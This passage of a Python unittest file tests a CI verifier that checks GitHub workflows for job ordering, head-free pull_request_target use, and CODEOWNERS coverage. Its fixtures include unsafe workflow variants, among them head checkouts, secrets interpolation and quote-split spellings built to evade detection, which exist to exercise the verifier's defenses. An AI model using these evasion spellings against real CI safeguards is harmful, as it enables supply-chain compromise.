        runs-on: ubuntu-latest
        steps: [{run: "true"}]
      panic-scan:
        runs-on: ubuntu-latest
        steps: [{run: "true"}]
      test-prep:
        needs: changes
        runs-on: ubuntu-latest
        steps: [{run: "true"}]
      test-run:
        needs: [test-prep, fmt, clippy, manifest-lock-consistency, panic-scan]
        runs-on: ubuntu-latest
        strategy: {matrix: {shard: [1, 2]}}
        steps:
          - uses: actions/download-artifact@v7
            with: {name: nextest-archive}
      e2e:
        needs: [changes, test-prep, fmt, clippy, manifest-lock-consistency, panic-scan]
        if: needs.changes.outputs.code == 'true'
        runs-on: ubuntu-latest
        strategy: {matrix: {shard: [1, 2]}}
        steps:
          - uses: actions/download-artifact@v7
            with: {name: nextest-archive}
    """
)
_FG_GATES = {"fmt", "clippy", "manifest-lock-consistency", "panic-scan"}


class TestFastGateFirst(unittest.TestCase):
    """Check 10: no heavy test shard starts behind a red fast deterministic gate."""

    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.root = self._tmp.name

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def errors(self, content: str, *, gates: set[str] = _FG_GATES) -> list[str]:
        _write(os.path.join(self.root, "workflows", "ci.yml"), content)
        errors: list[str] = []
        check_fast_gate_first(gates, errors, root=self.root)
        return errors

    def assertRefused(self, content: str, needle: str, **kw: object) -> None:
        errors = self.errors(content, **kw)  # type: ignore[arg-type]
        self.assertTrue(any(needle in e for e in errors), f"expected {needle!r} in {errors}")

    def test_valid_workflow_passes(self) -> None:
        self.assertEqual(self.errors(_FG_OK), [])

    def test_repo_ci_yml_passes(self) -> None:
        errors: list[str] = []
        check_fast_gate_first(_FG_GATES, errors)
        self.assertEqual(errors, [])

    def test_heavy_shard_missing_a_fast_gate_refused(self) -> None:
        for gate in sorted(_FG_GATES):
            bad = _FG_OK.replace(
                "needs: [test-prep, fmt, clippy, manifest-lock-consistency, panic-scan]",
                "needs: [test-prep, " + ", ".join(g for g in ("fmt", "clippy", "manifest-lock-consistency", "panic-scan") if g != gate) + "]",
            )
            self.assertRefused(bad, f"'test-run' does not `needs:` fast gate(s) ['{gate}']")

    def test_new_heavy_shard_without_fast_gates_refused(self) -> None:
        bad = _FG_OK + textwrap.indent(
            textwrap.dedent(
                """\
                seal-extra:
                  needs: test-prep
                  runs-on: ubuntu-latest
                  strategy: {matrix: {shard: [1]}}
                  steps:
                    - uses: actions/download-artifact@v7
                      with: {name: nextest-archive}
                """
            ),
            "  ",
        )
        self.assertRefused(bad, "'seal-extra' does not `needs:`")

    def test_bare_string_needs_refused(self) -> None:
        bad = _FG_OK.replace(
            "needs: [test-prep, fmt, clippy, manifest-lock-consistency, panic-scan]", "needs: test-prep"
        )
        self.assertRefused(bad, "'test-run' does not `needs:`")

    def test_status_function_if_refused(self) -> None:
        for fn in ("always()", "failure()", "'!cancelled()'", "ALWAYS ()", "${{ always() }}"):
            bad = _FG_OK.replace("if: needs.changes.outputs.code == 'true'", f"if: {fn}")
            self.assertRefused(bad, "calls a status function")

    def test_non_string_if_refused(self) -> None:
        bad = _FG_OK.replace("if: needs.changes.outputs.code == 'true'", "if: true")
        self.assertRefused(bad, "calls a status function")

    def test_anchor_lost_to_derivation_refused(self) -> None:
        bad = _FG_OK.replace("with: {name: nextest-archive}", "with: {name: other}", 1)
        self.assertRefused(bad, "'test-run' is not a matrix job")

    def test_missing_fast_gate_job_refused(self) -> None:
        bad = _FG_OK.replace("  panic-scan:\n    runs-on: ubuntu-latest\n    steps: [{run: \"true\"}]\n", "")
        self.assertNotEqual(bad, _FG_OK)
        self.assertRefused(bad, "fast gate 'panic-scan' is not a job")

    def test_fast_gate_not_a_manifest_gate_refused(self) -> None:
        self.assertRefused(_FG_OK, "is not a manifest `gate`", gates=_FG_GATES - {"clippy"})

    def test_fast_gate_with_heavy_need_refused(self) -> None:
        bad = _FG_OK.replace("  clippy:\n    needs: changes\n", "  clippy:\n    needs: [changes, test-prep]\n")
        self.assertNotEqual(bad, _FG_OK)
        self.assertRefused(bad, "fast gate 'clippy' needs ['test-prep']")

    def test_matrix_fast_gate_refused(self) -> None:
        bad = _FG_OK.replace("  fmt:\n    runs-on: ubuntu-latest\n", "  fmt:\n    runs-on: ubuntu-latest\n    strategy: {matrix: {x: [1]}}\n")
        self.assertNotEqual(bad, _FG_OK)
        self.assertRefused(bad, "fast gate 'fmt' has a `strategy:`")

    def test_malformed_needs_refused(self) -> None:
        bad = _FG_OK.replace(
            "needs: [test-prep, fmt, clippy, manifest-lock-consistency, panic-scan]", "needs: {a: b}"
        )
        self.assertRefused(bad, "'test-run' has a malformed `needs:`")

    def test_unreadable_workflow_refused(self) -> None:
        self.assertRefused("jobs: [", "cannot read")

    def test_missing_workflow_refused(self) -> None:
        errors: list[str] = []
        check_fast_gate_first(_FG_GATES, errors, root=self.root)
        self.assertTrue(any("cannot read" in e for e in errors), errors)


# A head-free pull_request_target + merge_group workflow: the shape
# `trust-root-diff.yml` takes (the live file is proven in `TestPullRequestTarget`).
_PRT_OK = """\
name: prt
on:
  pull_request_target:
    types: [opened, synchronize]
  merge_group:
permissions:
  contents: read
  pull-requests: read
jobs:
  check:
    name: check
    runs-on: ubuntu-latest
    steps:
      - name: Decide
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          gh api "repos/$GITHUB_REPOSITORY/contents/x?ref=$GITHUB_SHA" > "$RUNNER_TEMP/x"
          python3 "$RUNNER_TEMP/x"
"""


class TestPullRequestTarget(unittest.TestCase):
    """Check 12a: a pull_request_target workflow provably runs no head code."""

    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.fx = SccacheFixture(self._tmp.name)

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def errors(self, content: str) -> list[str]:
        self.fx.workflow("prt.yml", content)
        errors: list[str] = []
        check_pull_request_target(errors, root=self.fx.root)
        return errors

    def assertRefused(self, content: str, needle: str) -> None:
        errors = self.errors(content)
        self.assertTrue(any(needle in e for e in errors), f"expected {needle!r} in {errors}")

    def test_head_free_workflow_passes(self) -> None:
        self.assertEqual(self.errors(_PRT_OK), [])

    def test_workflow_without_pull_request_target_ignored(self) -> None:
        self.assertEqual(self.errors(_PRT_OK.replace("  pull_request_target:\n    types: [opened, synchronize]\n", "  pull_request:\n") + "      - uses: actions/checkout@v4\n"), [])

    def test_checkout_refused(self) -> None:
        self.assertRefused(_PRT_OK + "      - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567\n", "no action runs under")

    def test_local_action_refused(self) -> None:
        self.assertRefused(_PRT_OK + "      - uses: ./.github/actions/x\n", "no action runs under")

    def test_unrecognised_on_naming_pull_request_target_refused(self) -> None:
        bad = _PRT_OK.replace(
            "on:\n  pull_request_target:\n    types: [opened, synchronize]\n  merge_group:\n",
            "on: [pull_request_target, 1]\n",
        )
        self.assertRefused(bad, "no recognised shape but names `pull_request_target`")

    def test_reusable_workflow_refused(self) -> None:
        bad = _PRT_OK + "  reuse:\n    uses: ./.github/workflows/other.yml\n"
        self.assertRefused(bad, "calls a reusable workflow")

    def test_head_ref_expression_refused(self) -> None:
        bad = _PRT_OK.replace("set -euo pipefail", "echo ${{ github.head_ref }}")
        self.assertRefused(bad, "names the PR head")
        self.assertRefused(bad, "interpolates 'github.head_ref'")

    def test_head_sha_env_refused(self) -> None:
        self.assertRefused(_PRT_OK.replace("$GITHUB_SHA", "$GITHUB_HEAD_REF"), "names the PR head")

    def test_head_via_event_json_refused(self) -> None:
        bad = _PRT_OK.replace("set -euo pipefail", "jq -r .pull_request.HEAD.sha \"$GITHUB_EVENT_PATH\"")
        self.assertRefused(bad, "names the PR head")

    def test_head_word_escaped_in_scalar_refused(self) -> None:
        # A double-quoted YAML escape hides `head` from the raw text; the parsed
        # scalar still names it.
        bad = _PRT_OK.replace("run: |\n          set -euo pipefail\n", 'run: "echo \\x68ead\\n"\n        x: |\n          y\n')
        self.assertRefused(bad, "names the PR head")

    def test_merge_commit_refused(self) -> None:
        bad = _PRT_OK.replace("set -euo pipefail", "echo merge_commit_sha")
        self.assertRefused(bad, "names the PR head")

    def test_pull_ref_refused(self) -> None:
        bad = _PRT_OK.replace("set -euo pipefail", "echo refs/pull/1/merge")
        self.assertRefused(bad, "names the PR head")

    def test_git_refused(self) -> None:
        bad = _PRT_OK.replace("set -euo pipefail", "git fetch origin")
        self.assertRefused(bad, "runs `git`")

    def test_gh_pr_checkout_refused(self) -> None:
        bad = _PRT_OK.replace("set -euo pipefail", "gh pr checkout 1")
        self.assertRefused(bad, "other than `gh api`")

    def test_gh_repo_clone_refused(self) -> None:
        bad = _PRT_OK.replace("set -euo pipefail", "gh repo clone x")
        self.assertRefused(bad, "other than `gh api`")

    def test_quote_split_git_refused(self) -> None:
        for spelling in ('g""it fetch origin', "'git' fetch origin", "g\\it fetch origin"):
            with self.subTest(spelling=spelling):
                self.assertRefused(_PRT_OK.replace("set -euo pipefail", spelling), "runs `git`")

    def test_quote_split_gh_refused(self) -> None:
        for spelling in ('"gh" pr checkout 1', 'gh "pr" checkout 1', "g''h repo clone x"):
            with self.subTest(spelling=spelling):
                self.assertRefused(_PRT_OK.replace("set -euo pipefail", spelling), "other than `gh api`")

    def test_quote_split_git_in_heredoc_refused(self) -> None:
        bad = _PRT_OK.replace("set -euo pipefail", "bash <<'EOF'\n          g\"\"it fetch origin\n          EOF")
        self.assertRefused(bad, "runs `git`")

    def test_quote_split_head_refused(self) -> None:
        self.assertRefused(_PRT_OK.replace("set -euo pipefail", 'echo "$GITHUB_HE""AD_REF"'), "names the PR head")

    def test_quoted_gh_api_admitted(self) -> None:
        self.assertEqual(self.errors(_PRT_OK.replace("gh api", '"gh" api')), [])

    def test_secrets_refused(self) -> None:
        bad = _PRT_OK.replace("${{ github.token }}", "${{ secrets.GITHUB_TOKEN }}")
        self.assertRefused(bad, "names `secrets`")
        self.assertRefused(bad, "interpolates")

    def test_pr_title_expression_refused(self) -> None:
        bad = _PRT_OK.replace("set -euo pipefail", "echo \"${{ github.event.pull_request.title }}\"")
        self.assertRefused(bad, "interpolates 'github.event.pull_request.title'")

    def test_token_any_case_admitted(self) -> None:
        self.assertEqual(self.errors(_PRT_OK.replace("${{ github.token }}", "${{ GitHub.TOKEN }}")), [])

    def test_ungrammatical_expression_refused(self) -> None:
        bad = _PRT_OK.replace("${{ github.token }}", "${{ github.token ) }}")
        self.assertRefused(bad, "outside the grammar")

    def test_token_call_argument_refused(self) -> None:
        bad = _PRT_OK.replace("${{ github.token }}", "${{ format('{0}', github.token) }}")
        self.assertRefused(bad, "interpolates")

    def test_indexed_token_refused(self) -> None:
        bad = _PRT_OK.replace("${{ github.token }}", "${{ github['token'] }}")
        self.assertRefused(bad, "interpolates")

    def test_whitespace_normalised_token_admitted(self) -> None:
        self.assertEqual(self.errors(_PRT_OK.replace("${{ github.token }}", "${{   github.token\t}}")), [])

    def test_missing_permissions_refused(self) -> None:
        bad = _PRT_OK.replace("permissions:\n  contents: read\n  pull-requests: read\n", "")
        self.assertRefused(bad, "declares no top-level `permissions:`")

    def test_top_level_write_refused(self) -> None:
        bad = _PRT_OK.replace("pull-requests: read", "pull-requests: write")
        self.assertRefused(bad, "top-level `permissions:` must be read-only")

    def test_write_all_refused(self) -> None:
        bad = _PRT_OK.replace("permissions:\n  contents: read\n  pull-requests: read\n", "permissions: write-all\n")
        self.assertRefused(bad, "top-level `permissions:` must be read-only")

    def test_job_level_write_refused(self) -> None:
        bad = _PRT_OK.replace("    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    permissions:\n      statuses: write\n")
        self.assertRefused(bad, "job 'check' `permissions:` must be read-only")

    def test_list_form_trigger_refused(self) -> None:
        bad = _PRT_OK.replace(
            "on:\n  pull_request_target:\n    types: [opened, synchronize]\n  merge_group:\n",
            "on: [pull_request_target]\n",
        ) + "      - uses: actions/checkout@v4\n"
        self.assertRefused(bad, "no action runs under")

    def test_string_form_trigger_refused(self) -> None:
        bad = _PRT_OK.replace(
            "on:\n  pull_request_target:\n    types: [opened, synchronize]\n  merge_group:\n",
            "on: pull_request_target\n",
        ) + "      - uses: actions/checkout@v4\n"
        self.assertRefused(bad, "no action runs under")

    def test_live_workflows_pass(self) -> None:
        errors: list[str] = []
        check_pull_request_target(errors)
        self.assertEqual(errors, [])

    def test_live_trust_root_diff_is_head_free_under_both_triggers(self) -> None:
        with open(os.path.join(os.path.dirname(HERE), "workflows", "trust-root-diff.yml")) as f:
            live = f.read()
        self.assertIn("pull_request_target", live)
        self.assertEqual(self.errors(live), [])
        errors: list[str] = []
        check_merge_queue({"prt.yml"}, errors, root=self.fx.root)
        self.assertEqual(errors, [])


# `_PRT_OK` naming the protected tree the way `trust-root-diff.yml` does: it
# fetches `.github/ci/*` through the REST API into the runner temp directory.
_PRT_TREE = _PRT_OK.replace(
    '          gh api "repos/$GITHUB_REPOSITORY/contents/x?ref=$GITHUB_SHA" > "$RUNNER_TEMP/x"\n',
    "          for f in .github/ci/trust_roots.py .github/CODEOWNERS; do\n"
    '            gh api "repos/$GITHUB_REPOSITORY/contents/$f?ref=$GITHUB_SHA" > "$RUNNER_TEMP/${f##*/}"\n'
    "          done\n",
)
_NOT_CLOSED = "but is not itself one of"
_WRITES_TREE = "writes into .github/ci/"


class TestHeadFreeExemption(unittest.TestCase):
    """Check 7 over a head-free workflow (`head_free`): its workspace holds no
    checkout, so the ordering rule's step half and the write scan are not
    asked of it — and no other workflow earns that."""

    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.fx = SccacheFixture(self._tmp.name)

    def errors(self, content: str) -> list[str]:
        self.fx.workflow("prt.yml", content)
        return self.fx.errors()

    def assertRefused(self, content: str, *needles: str) -> None:
        errors = self.errors(content)
        for needle in needles:
            self.assertTrue(any(needle in e for e in errors), f"expected {needle!r} in {errors}")

    def test_fixture_names_the_tree(self) -> None:
        self.assertIn(".github/ci/trust_roots.py", _PRT_TREE)
        self.assertNotIn("contents/x?", _PRT_TREE)

    def test_head_free_workflow_naming_the_tree_passes(self) -> None:
        self.assertEqual(self.errors(_PRT_TREE), [])

    def test_live_trust_root_diff_passes(self) -> None:
        with open(os.path.join(verify_manifest.REPO_ROOT, "workflows", "trust-root-diff.yml")) as f:
            live = f.read()
        self.assertIn(".github/ci/trust_roots.py", live)
        self.assertEqual(self.errors(live), [])

    def test_live_workspaces(self) -> None:
        vm = verify_manifest
        errors: list[str] = []
        wfs = {wf.fname: wf.workspace for wf in vm._load_sccache_workflows(vm.REPO_ROOT, errors)}
        self.assertEqual(errors, [])
        self.assertEqual(sorted(f for f, w in wfs.items() if w is vm.Workspace.NONE), ["trust-root-diff.yml"])
        self.assertIs(wfs["ci.yml"], vm.Workspace.CHECKOUT)

    def test_leading_checkout_revokes_the_exemption(self) -> None:
        bad = _PRT_TREE.replace("    steps:\n", f"    steps:\n      - name: Checkout\n        uses: {_CHECKOUT}\n")
        self.assertRefused(bad, _NOT_CLOSED)

    def test_trailing_checkout_revokes_the_exemption(self) -> None:
        self.assertRefused(_PRT_TREE + f"      - uses: {_CHECKOUT}\n", _NOT_CLOSED)

    def test_git_revokes_the_exemption(self) -> None:
        bad = _PRT_TREE.replace("set -euo pipefail", "set -euo pipefail\n          git fetch origin")
        self.assertRefused(bad, _NOT_CLOSED)

    def test_quote_split_git_revokes_the_exemption(self) -> None:
        bad = _PRT_TREE.replace("set -euo pipefail", 'set -euo pipefail\n          g""it fetch origin')
        self.assertRefused(bad, _NOT_CLOSED)

    def test_write_scan_runs_once_the_exemption_is_revoked(self) -> None:
        bad = _PRT_TREE.replace(
            "set -euo pipefail", "set -euo pipefail\n          git init\n          cp x .github/ci/y.py"
        )
        self.assertRefused(bad, _WRITES_TREE, _NOT_CLOSED)

    def test_secrets_revokes_the_exemption(self) -> None:
        bad = _PRT_TREE.replace("${{ github.token }}", "${{ secrets.GITHUB_TOKEN }}")
        self.assertRefused(bad, _NOT_CLOSED)

    def test_pull_request_workflow_naming_the_tree_refused(self) -> None:
        bad = _PRT_TREE.replace("  pull_request_target:\n", "  pull_request:\n")
        self.assertNotIn("pull_request_target", bad)
        self.assertRefused(bad, _NOT_CLOSED, _WRITES_TREE)

    def test_push_workflow_naming_the_tree_refused(self) -> None:
        bad = _PRT_TREE.replace("  pull_request_target:\n    types: [opened, synchronize]\n", "  push:\n")
        self.assertNotIn("pull_request_target", bad)
        self.assertRefused(bad, _NOT_CLOSED, _WRITES_TREE)

    def test_job_masking_refused(self) -> None:
        for key in ("continue-on-error: true", "if: github.event_name == 'merge_group'"):
            with self.subTest(key=key):
                bad = _PRT_TREE.replace("    runs-on: ubuntu-latest\n", f"    runs-on: ubuntu-latest\n    {key}\n")
                self.assertRefused(bad, "a skipped or failure-ignored job")

    def test_job_needs_refused(self) -> None:
        bad = _PRT_TREE.replace("    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    needs: other\n")
        bad += "  other:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n"
        self.assertRefused(bad, "with needs: ['other']")

    def test_self_hosted_runner_refused(self) -> None:
        bad = _PRT_TREE.replace("    runs-on: ubuntu-latest\n", "    runs-on: self-hosted\n")
        self.assertRefused(bad, "not one literal GitHub-hosted Ubuntu label")

    def test_job_services_refused(self) -> None:
        bad = _PRT_TREE.replace(
            "    runs-on: ubuntu-latest\n",
            "    runs-on: ubuntu-latest\n    services:\n      db:\n        image: postgres@sha256:" + "0" * 64 + "\n",
        )
        self.assertRefused(bad, "with a job services:")

    def test_workflow_defaults_shell_refused(self) -> None:
        bad = _PRT_TREE.replace("jobs:\n", "defaults:\n  run:\n    shell: sh\njobs:\n")
        self.assertRefused(bad, "defaults.run.shell")


class TestTrustRoots(unittest.TestCase):
    """Check 12b: `.github/CODEOWNERS` is live, self-protecting, and alone."""

    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.root = os.path.join(self._tmp.name, ".github")
        self.tracked = [
            ".github/CODEOWNERS",
            ".github/ci/trust_roots.py",
            ".github/ci/verify-manifest.py",
            ".github/workflows/trust-root-diff.yml",
            "Cargo.toml",
            "src/a/Cargo.toml",
        ]

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def errors(self, codeowners: str | None, tracked: list[str] | None = None) -> list[str]:
        if codeowners is not None:
            _write(os.path.join(self.root, "CODEOWNERS"), codeowners)
        errors: list[str] = []
        check_trust_roots(errors, root=self.root, tracked=self.tracked if tracked is None else tracked)
        return errors

    def assertRefused(self, codeowners: str | None, needle: str, tracked: list[str] | None = None) -> None:
        errors = self.errors(codeowners, tracked)
        self.assertTrue(any(needle in e for e in errors), f"expected {needle!r} in {errors}")

    _OK = "/.github/ @o\nCargo.toml @o\n"

    def test_valid_passes(self) -> None:
        self.assertEqual(self.errors(self._OK), [])

    def test_missing_codeowners_refused(self) -> None:
        self.assertRefused(None, "CODEOWNERS is missing")

    def test_unparseable_codeowners_refused(self) -> None:
        self.assertRefused(self._OK + "/x/[ab] @o\n", "CODEOWNERS refused")

    def test_dead_rule_refused(self) -> None:
        self.assertRefused(self._OK + "/deny.toml @o\n", "'/deny.toml' matches no tracked file")

    def test_unowned_machinery_refused(self) -> None:
        self.assertRefused(
            "/.github/ci/ @o\n/.github/CODEOWNERS @o\nCargo.toml @o\n",
            ".github/workflows/trust-root-diff.yml is not a trust root",
        )

    _MACHINERY_ONLY = "".join(f"/{p} @o\n" for p in verify_manifest.TRUST_ROOT_MACHINERY) + "Cargo.toml @o\n"

    def test_machinery_only_passes_when_nothing_else_is_tracked(self) -> None:
        self.assertEqual(self.errors(self._MACHINERY_ONLY), [])

    def test_unowned_github_file_refused(self) -> None:
        for p in (
            ".github/ci/shell_lex.py",
            ".github/workflows/ci.yml",
            ".github/actions/x/action.yml",
            ".github/ISSUE_TEMPLATE/bug.md",
        ):
            with self.subTest(path=p):
                self.assertRefused(
                    self._MACHINERY_ONLY, f"{p} is under .github/ but is not a trust root", [*self.tracked, p]
                )

    def test_owned_github_file_passes(self) -> None:
        self.assertEqual(self.errors(self._OK, [*self.tracked, ".github/ci/shell_lex.py"]), [])

    def test_stray_root_codeowners_refused(self) -> None:
        self.assertRefused(self._OK, "CODEOWNERS: a second CODEOWNERS file", [*self.tracked, "CODEOWNERS"])

    def test_stray_docs_codeowners_refused(self) -> None:
        self.assertRefused(self._OK, "docs/CODEOWNERS: a second", [*self.tracked, "docs/CODEOWNERS"])

    def _workflow(self, run: str) -> None:
        _write(os.path.join(self.root, "workflows", "w.yml"), f"on: push\njobs:\n  j:\n    steps:\n      - run: {run}\n")

    def test_unowned_ci_run_script_refused(self) -> None:
        self._workflow("bash editors/gate.sh")
        self.assertRefused(self._OK, "editors/gate.sh is run by CI but is not a trust root", [*self.tracked, "editors/gate.sh"])

    def test_unowned_dot_slash_ci_run_script_refused(self) -> None:
        self._workflow("./editors/gate.py --check")
        self.assertRefused(self._OK, "editors/gate.py is run by CI", [*self.tracked, "editors/gate.py"])

    def test_owned_ci_run_script_passes(self) -> None:
        self._workflow("bash editors/gate.sh")
        tracked = [*self.tracked, "editors/gate.sh"]
        self.assertEqual(self.errors(self._OK + "/editors/ @o\n", tracked), [])

    def test_longer_path_is_not_the_script(self) -> None:
        self._workflow("bash editors/gate.sh.bak/x editors/gate.shx")
        self.assertEqual(self.errors(self._OK, [*self.tracked, "editors/gate.sh"]), [])

    def test_live_codeowners_passes(self) -> None:
        errors: list[str] = []
        check_trust_roots(errors)
        self.assertEqual(errors, [])


if __name__ == "__main__":
    unittest.main()
